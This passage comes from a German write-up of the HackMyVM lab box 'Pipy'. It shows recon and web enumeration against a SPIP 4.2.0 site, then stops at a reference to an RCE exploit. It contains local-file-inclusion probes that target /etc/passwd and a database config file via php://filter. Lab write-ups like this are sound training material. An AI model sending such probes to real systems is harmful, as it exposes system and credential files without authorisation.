@@ -1,0 +1,1145 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pipy - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header angepasst -->
+    <div class="header-bg">
+        <h1>Pipy - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe Rot wird durch CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente für Rot -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">nc (Netcat)</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">http.server (Python)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ldd</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">make</div>
+                <div class="tool-item">(Custom Exploit: rce_spip.py)</div>
+                <div class="tool-item">(Custom Exploit: CVE-2023-4911)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis gemäß Struktur -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Test beginnt standardmäßig mit einem `arp-scan -l`, um aktive Geräte im lokalen Netzwerk zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.106` und MAC `08:00:27:7d:63:60` (Oracle VirtualBox) wird identifiziert. Dies ist das Ziel "Pipy".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP notieren und für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung und Segmentierung können helfen, solche Scans zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.106	08:00:27:7d:63:60	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts` Datei wird bearbeitet, um der IP `192.168.2.106` den Hostnamen `pipy.hmv` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erleichtert die Verwendung des Zielnamens in nachfolgenden Befehlen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hostnamen `pipy.hmv` verwenden.<br><strong>Empfehlung (Admin):</strong> Lokale Angreiferkonfiguration.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# (Inhalt nach Bearbeitung)
+127.0.0.1	localhost
+192.168.2.106   pipy.hmv
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Webserver-Scanner `nikto` wird auf Port 80 des Ziels (`192.168.2.106`) ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert Apache/2.4.52 (Ubuntu) und macht mehrere wichtige Funde:
+                *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+                *   Ungewöhnliche Header `x-spip-cache` und `composed-by`, wobei letzterer auf "SPIP 4.2.0" als CMS und eine potentiell interessante Datei `/local/config.txt` hinweist.
+                *   Veraltete Apache-Version.
+                *   Directory Indexing für `/config/` und `/tmp/`.
+                *   Eine Standard `htaccess.txt` von Joomla! (wahrscheinlich False Positive, da SPIP läuft).
+                *   PHP Composer-Dateien (`composer.json`, `composer.lock`), die Konfigurationsinfos enthalten könnten.
+                *   Eine `README.md`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die wichtigsten Hinweise sind SPIP 4.2.0 (bekannte Schwachstellen recherchieren!), die mögliche `/local/config.txt`, die indizierbaren Verzeichnisse `/config` und `/tmp` sowie die Composer-Dateien. Untersuchen Sie diese Punkte priorisiert.<br><strong>Empfehlung (Admin):</strong> Header hinzufügen, Apache aktualisieren, Directory Indexing deaktivieren, sensible Dateien (`config.txt`, Composer-Dateien) sichern, SPIP CMS auf die neueste Version patchen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nikto -h 192.168.2.106</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.106
++ Target Hostname:    192.168.2.106
++ Target Port:        80
++ Start Time:         2023-10-26 22:38:17 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: Uncommon header 'x-spip-cache' found, with contents: 86400.
++ /: Uncommon header 'composed-by' found, with contents: SPIP 4.2.0 @ www.spip.net + http://192.168.2.106/local/config.txt.
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /config/: Directory indexing found.
++ /config/: Configuration information may be available remotely.
++ /tmp/: Directory indexing found.
++ /tmp/: This might be interesting.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
++ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
++ /README.md: Readme Found.
++ 8102 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2023-10-26 22:38:48 (GMT2) (31 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -sV -T5 -A -Pn -p-`) wird auf das Ziel ausgeführt. `-sC` führt Standard-NSE-Skripte aus, `-Pn` überspringt die Host-Discovery (Ping-Scan), falls der Host nicht auf Pings antwortet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (SSH - OpenSSH 8.9p1 Ubuntu) und 80 (HTTP - Apache 2.4.52 Ubuntu). Die NSE-Skripte identifizieren ebenfalls das CMS als SPIP 4.2.0 über den Generator-Tag und liefern den Seitentitel "Mi sitio SPIP". Die OS-Erkennung und MAC-Adresse werden bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Bestätigung von SPIP 4.2.0 ist der wichtigste Fund. Suchen Sie gezielt nach Exploits für diese Version.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie SPIP 4.2.0 dringend, da diese Version bekannte Schwachstellen aufweist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.106 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 22:38 CEST
+Nmap scan report for pipy.hmv (192.168.2.106)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
+|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-generator: SPIP 4.2.0
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Mi sitio SPIP
+MAC Address: 08:00:27:7D:63:60 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms pipy.hmv (192.168.2.106)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der vorherige Nmap-Scan wird gefiltert (`grep open`) wiederholt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (SSH) und 80 (HTTP).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für schnellen Überblick.<br><strong>Empfehlung (Admin):</strong> Keine neuen Informationen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.106 -p- | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche eingesetzt, mit einer großen Wortliste und vielen Erweiterungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet Standard-SPIP-Verzeichnisse (`/local`, `/vendor`, `/config`, `/tmp`, `/IMG`, `/ecrire`), `index.php`, `spip.php`, `LICENSE`, `spip.png` und `htaccess.txt`. Bestätigt die Ergebnisse von Nikto und Nmap.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `htaccess.txt` und den Inhalt der Verzeichnisse, insbesondere `/config`, `/tmp` und `/ecrire` (Admin-Bereich).<br><strong>Empfehlung (Admin):</strong> Sichern Sie SPIP-Verzeichnisse gemäß den Best Practices des CMS.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">gobuster dir -u http://pipy.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+http://pipy.hmv/index.php            (Status: 200) [Size: 7519]
+http://pipy.hmv/local                (Status: 301) [Size: 304] [--> http://pipy.hmv/local/]
+http://pipy.hmv/javascript           (Status: 301) [Size: 309] [--> http://pipy.hmv/javascript/]
+http://pipy.hmv/vendor               (Status: 301) [Size: 305] [--> http://pipy.hmv/vendor/]
+http://pipy.hmv/config               (Status: 301) [Size: 305] [--> http://pipy.hmv/config/]
+http://pipy.hmv/tmp                  (Status: 301) [Size: 302] [--> http://pipy.hmv/tmp/]
+http://pipy.hmv/LICENSE              (Status: 200) [Size: 35147]
+http://pipy.hmv/IMG                  (Status: 301) [Size: 302] [--> http://pipy.hmv/IMG/]
+http://pipy.hmv/spip.png             (Status: 200) [Size: 1212]
+http://pipy.hmv/spip.php             (Status: 200) [Size: 7518]
+http://pipy.hmv/htaccess.txt         (Status: 200) [Size: 4307]
+http://pipy.hmv/ecrire               (Status: 301) [Size: 305] [--> http://pipy.hmv/ecrire/]
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der gefundenen Datei `htaccess.txt` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Standard `.htaccess`-Datei für SPIP 4.2. Sie enthält Umschreiberegeln (RewriteRules) für verschiedene URL-Typen (propres, libres etc.), API-Endpunkte (`.api`) und Standarddateien (`robots.txt`, `favicon.ico`, `sitemap.xml`), die alle an `spip.php` weitergeleitet werden. Sie blockiert den Zugriff auf versteckte Dateien (beginnend mit ".") und Composer-Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Regeln zeigen, dass die meisten Anfragen über `spip.php` laufen. Achten Sie auf Parameter in `spip.php`, die für Angriffe wie LFI oder SQLi anfällig sein könnten (z.B. `page=`, `action=`, `id=`).<br><strong>Empfehlung (Admin):</strong> Dies ist eine Standarddatei. Stellen Sie sicher, dass sie korrekt als `.htaccess` im Web-Root aktiviert ist, um die darin enthaltenen Schutzmechanismen (Blockierung von `.`-Dateien) zu nutzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Inhalt von http://pipy.hmv/htaccess.txt
+
+# Fichier .htaccess                               SPIP v 4.2 #
+#                                                            #
+# Permet de controler les URLs et la version de php utilisee #
+# Compatible avec les URLs 'html', 'propres' et 'propres2'   #
+#                                                            #
+# Pour utiliser ce fichier renommez-le '.htaccess' dans le   #
+# repertoire racine du site, en veillant a ne pas ecraser un #
+# .htaccess personnalise qui s'y trouverait deja             #
+#                                                            #
+# Attention certains hebergeurs desactivent tout ou partie   #
+# des fonctions du fichier .htaccess ; celui-ci est donc     #
+# indicatif - en cas de difficulte voir sur les forums SPIP  #
+
+
+RewriteEngine On
+
+# CONFIGURATION #
+
+# Configuration sous-repertoire
+
+# Calcule automatiquememt le RewriteBase (qui permet de faire fonctionner
+# les belles URLs). De la sorte, un meme site peut etre affiche en racine
+# ou dans un sous repertoire sans devoir modifier la ligne RewriteBase.
+RewriteCond %{REQUEST_URI}::$1 ^(/.+)/(.*)::\2$
+RewriteRule ^(.*) - [E=BASE:%1]
+
+# En alternative aux 2 lignes precedentes (a commenter dans ce cas),
+# vous pouvez indiquer un RewriteBase specifique
+#RewriteBase /
+
+# FIN CONFIGURATION #
+
+
+# REGLAGES PERSONNALISES #
+# Inscrivez ci-dessous vos reglages supplementaires
+
+
+
+
+# FIN REGLAGES PERSONNALISES #
+
+
+# GESTIONS DES URLS SPIP #
+#
+# Regle optionnelle pour les articles dont on force l'URL avec leur id numerique
+# Attention dans ce cas a ce que leur URL textuelle ne soit pas la meme
+# qu'une URL de rubrique ou autre mot cle etc...
+#RewriteRule ^([1-9][0-9]*)$     spip.php?action=redirect&type=article&status=301&id=$1 [QSA,L]
+
+#
+# URLs page=xxx Standard SPIP
+# necessite le bloc suivant pour ne pas court-circuiter les /api.php/...
+#
+#RewriteRule ^(([^/]+/)?(robots\.txt|favicon\.ico|sitemap\.xml))$    spip.php?page=$1 [QSA,L]
+
+#
+# APIs
+# http://site/xmlrpc.api
+# http://site/atom.api/articles/1234
+# https://site/offline.api.sw.js
+
+RewriteRule ^(ecrire/)?([\w]+)\.api([/.](.*))?$ spip.php?action=api_$2&arg=$4 [QSA,L]
+
+# Fin des APIs
+#
+
+#
+# URLs "propres", "propres2", "libres", "arbo"
+# Laisser passer les documents dans les squelettes, sinon boucle infinie sur les fonds
+RewriteRule ^(squelettes(-dist)?/.*)$ $0 [L]
+# Bloquer le chargement des fichiers squelettes qui se terminent par ~ ou #
+RewriteRule (^|/)(.*([.]php[345]?|[.]html?|[.]txt|[.]css|[.]js|[.]inc|[.]yaml|[.]xml)[~#])$ - [R=404,L]
+# En revanche, les URLs correspondant a des fichiers ou dossiers existants ne sont pas
+# transformees (critere demande par file ou dir, mais pas par link)
+RewriteCond %{REQUEST_FILENAME} -f [OR]
+RewriteCond %{REQUEST_FILENAME} -d
+RewriteRule .* - [S=1]
+# Tout le reste est envoye a spip.php avec le parametre url= pour interpretation
+# (voir le code de public/assembler() et la fonction generer_url_public())
+RewriteRule ^([^\.]+(\.html)?)$		spip.php [QSA,E=url_propre:$0,L]
+
+# Fin URLs "propres" et "propres2"
+#
+
+#
+# Divers
+
+# bloquer les acces aux fichiers caches (.svn, .git, etc)
+RewriteCond %{REQUEST_URI} !^/.well-known/
+RewriteRule "(^|/)\." - [R=404,NC,L]
+# bloquer les informations Composer
+RedirectMatch 404 ^/composer\.(json|lock|phar)$
+
+#
+# Fichiers "standards" (si absents de la racine)
+#
+RewriteRule ^robots[.]txt$      spip.php?page=robots.txt [QSA,L]
+RewriteRule ^favicon[.]ico$      spip.php?page=favicon.ico [QSA,L]
+RewriteRule ^sitemap[.]xml$      spip.php?page=sitemap.xml [QSA,L]
+
+# FIN GESTIONS DES URLS SPIP #
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Verschiedene URLs werden aufgerufen, um Schwachstellen auszunutzen oder Informationen zu sammeln:
+                *   `spip.php?page=sitemap.xml`: Zeigt die Sitemap an, enthüllt aber eine interne IP (192.168.0.119).
+                *   `spip.php?page=/etc/passwd`: Versuch einer Local File Inclusion (LFI), wird blockiert ("Zugang gesperrt").
+                *   `spip.php?page=php://filter/convert.base64-encode/resource=/config/connect.php`: Versuch, die Konfigurationsdatei mittels PHP-Filter als Base64 auszulesen, wird ebenfalls blockiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Sitemap enthüllt eine interne IP, was auf Netzwerkstrukturen hindeuten kann. Die LFI-Versuche scheitern, was zeigt, dass `spip.php` (oder die Serverkonfiguration) einen gewissen Schutz gegen einfache LFI über den `page`-Parameter bietet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die interne IP. Da LFI über `page` nicht direkt funktioniert, suchen Sie nach anderen Parametern oder Schwachstellen in SPIP 4.2.0, insbesondere RCE oder SQLi.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine internen IPs in öffentlich zugänglichen Dateien wie Sitemaps preisgegeben werden. Halten Sie SPIP aktuell, um bekannte LFI- und andere Schwachstellen zu schließen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Aufruf von http://pipy.hmv/spip.php?page=sitemap.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+<url>
+<loc>http://192.168.0.119/</loc>
+<changefreq>hourly</changefreq>
+</url>
+</urlset>
+
+
+# Aufruf von http://pipy.hmv/spip.php?page=/etc/passwd
+# Ergebnis: Zugang gesperrt
+
+
+# Aufruf von http://pipy.hmv/spip.php?page=php://filter/convert.base64-encode/resource=/config/connect.php
+# Ergebnis: Zugang gesperrt
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneuter `dirb`-Scan, diesmal tiefergehend, um weitere Verzeichnisse und Dateien zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet weitere Unterverzeichnisse unter `/ecrire/` (SPIP-Adminbereich). Bestätigt `/config`, `/local`, `/tmp` etc.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunden Sie die Struktur von `/ecrire/` weiter. Untersuchen Sie `/tmp` auf interessante Dateien.<br><strong>Empfehlung (Admin):</strong> Keine neuen kritischen Funde, aber Bestätigung der Notwendigkeit, die SPIP-Installation abzusichern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">dirb http://pipy.hmv</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Oct 26 22:38:37 2023
+URL_BASE: http://pipy.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4615
+
+---- Scanning URL: http://pipy.hmv/ ----
+==> DIRECTORY: http://pipy.hmv/config/
+==> DIRECTORY: http://pipy.hmv/ecrire/
++ http://pipy.hmv/index.php (CODE:200|SIZE:7519)
+==> DIRECTORY: http://pipy.hmv/javascript/
++ http://pipy.hmv/LICENSE (CODE:200|SIZE:35147)
+==> DIRECTORY: http://pipy.hmv/local/
+==> DIRECTORY: http://pipy.hmv/prive/
++ http://pipy.hmv/server-status (CODE:403|SIZE:273)
+==> DIRECTORY: http://pipy.hmv/squelettes-dist/
+==> DIRECTORY: http://pipy.hmv/tmp/
+==> DIRECTORY: http://pipy.hmv/vendor/
+
+---- Entering directory: http://pipy.hmv/ecrire/ ----
+==> DIRECTORY: http://pipy.hmv/ecrire/action/
+==> DIRECTORY: http://pipy.hmv/ecrire/auth/
+==> DIRECTORY: http://pipy.hmv/ecrire/base/
+==> DIRECTORY: http://pipy.hmv/ecrire/exec/
+==> DIRECTORY: http://pipy.hmv/ecrire/inc/
++ http://pipy.hmv/ecrire/index.php (CODE:302|SIZE:432)
+==> DIRECTORY: http://pipy.hmv/ecrire/install/
+==> DIRECTORY: http://pipy.hmv/ecrire/lang/
+==> DIRECTORY: http://pipy.hmv/ecrire/notifications/
+==> DIRECTORY: http://pipy.hmv/ecrire/plugins/
+==> DIRECTORY: http://pipy.hmv/ecrire/public/
+==> DIRECTORY: http://pipy.hmv/ecrire/req/
+==> DIRECTORY: http://pipy.hmv/ecrire/src/
+==> DIRECTORY: http://pipy.hmv/ecrire/urls/
+==> DIRECTORY: http://pipy.hmv/ecrire/xml/
+
+[...]
+                    </pre> <!-- Dirb-Ausgabe gekürzt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Manuelle Untersuchung des `/tmp`-Verzeichnisses, findet die Datei `job_queue_next.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält nur einen Zeitstempel (Unix-Timestamp), wahrscheinlich für die SPIP-interne Job-Verarbeitung. Bietet keine direkten Hinweise für einen Exploit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren, aber geringe Priorität.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/tmp` keine sensiblen Daten enthält und korrekte Berechtigungen hat.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Manuelle Untersuchung von http://pipy.hmv/tmp/
+# Inhalt von http://pipy.hmv/tmp/job_queue_next.txt:
+1698359913
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt einer lokalen Datei `/home/cyber/Downloads/mysql.log` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Logdatei stammt vom Angreifer-System, nicht vom Ziel. Sie zeigt fehlgeschlagene MySQL-Login-Versuche gegen eine *andere* IP (`192.168.0.101`) mit Benutzernamen `admin` und `spipuser`. Dies ist für den aktuellen Test auf `192.168.2.106` (pipy.hmv) irrelevant, könnte aber aus einem früheren Test stammen und den Benutzernamen `spipuser` als potenzielles Ziel für MySQL auf `pipy.hmv` nahelegen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie den Benutzernamen `spipuser` als möglichen MySQL-Benutzer auf dem Ziel. Der Rest des Logs ist nicht relevant für Pipy.<br><strong>Empfehlung (Admin):</strong> Keine Aktion für Pipy erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat /home/cyber/Downloads/mysql.log</span></div>
+                     <pre>
+2023-10-03 15:41:30 192.168.0.101 (pid 4740) :Pri:INFO: Echec mysqli_connect. Erreur : Access denied for user 'admin'@'localhost' (using password: YES)
+[...]
+2023-10-03 15:42:58 192.168.0.101 (pid 4802) :Pri:INFO: Echec mysqli_connect. Erreur : Access denied for user 'spipuser'@'localhost' (using password: YES)
+[...]
+                     </pre> <!-- Gekürzte Log-Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung des Inhalts einer Cache-Datei (`chemin.txt`) aus `/tmp/cache/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält serialisierte PHP-Daten (Arrays), die interne Dateipfade des SPIP-CMS auf dem Server offenlegen (z.B. `ecrire/inc/meta.php`, `plugins-dist/textwheel/inc/notes.php`). Sie enthält auch einen Hinweis auf `webmestre` und `varchar(3)`, was auf Datenbankstrukturen hindeuten könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offengelegten Pfade können helfen, die Struktur der Anwendung besser zu verstehen und gezieltere Angriffe (z.B. auf spezifische Plugin-Pfade) zu planen. Die Datenbank-Hinweise sind vage.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie SPIP oder den Webserver so, dass solche Cache-Dateien nicht öffentlich zugänglich sind oder keine sensiblen Pfadinformationen enthalten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Inhalt von http://pipy.hmv/tmp/cache/chemin.txt (gekürzt)
+a:2:{s:32:"8dffc0e7c7f8f6c256250ae4d6e303b6";a:36:{s:0:"";a:257:{s:12:"inc/meta.php";s:19:"ecrire/inc/meta.php";s:12:"inc/lang.php";s:19:"ecrire/inc/lang.php";s:20:"inc/filtres_mini.php";s:27:"ecrire/inc/filtres_mini.php";[...]s:12:"inc/presentation";[...]}}
+
+# Weiter unten in der Datei (Beispiel)
+# ... webmestre";s:33:"varchar(3) ...
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung der Datei `composer.json` aus dem `/vendor/jakeasmith/http_build_url/`-Verzeichnis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Enthält Metadaten über eine verwendete PHP-Bibliothek (`jakeasmith/http_build_url`). Bietet Informationen über Abhängigkeiten, aber keine direkten Zugangsdaten oder Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die verwendete Bibliothek. Suchen Sie nach bekannten Schwachstellen in dieser spezifischen Bibliothek oder Version.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `vendor`-Verzeichnisse nicht web-zugänglich sind. Halten Sie alle Composer-Abhängigkeiten aktuell.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Inhalt von http://pipy.hmv/vendor/jakeasmith/http_build_url/composer.json (formatiert)
+{
+  "name": "jakeasmith/http_build_url",
+  "description": "Provides functionality for http_build_url() to environments without pecl_http.",
+  "license": "MIT",
+  "authors": [
+    {
+      "name": "Jake A. Smith",
+      "email": "theman@jakeasmith.com"
+    }
+  ],
+  "support": {
+    "issues": "https://github.com/jakeasmith/http_build_url/issues",
+    "source": "https://github.com/jakeasmith/http_build_url"
+  },
+  "autoload": {
+    "files": [
+      "src/http_build_url.php"
+    ]
+  }
+}
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung des Quellcodes von `spip.php` und Identifizierung des Generator-Tags, der SPIP 4.2.0 bestätigt. Verweis auf einen Exploit für CVE-2023-27372 in SPIP < 4.2.1 (Exploit-DB 51536), der Remote Code Execution (RCE) ermöglicht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der wahrscheinlichste Weg zum Initial Access. Die Version 4.2.0 ist für diese RCE-Schwachstelle anfällig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie den Exploit (z.B. von Exploit-DB oder GitHub) herunter und verwenden Sie ihn, um Befehle auf dem Zielserver auszuführen.<br><strong>Empfehlung (Admin):</strong> Patchen Sie SPIP sofort auf Version 4.2.1 oder höher.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Quellcode von http://pipy.hmv/spip.php enthält:
+<meta name="generator" content="SPIP 4.2.0" />
+
+# Recherche nach Exploits für SPIP 4.2.0 führt zu CVE-2023-27372 (RCE)
+# Beispiel: https://www.exploit-db.com/exploits/51536
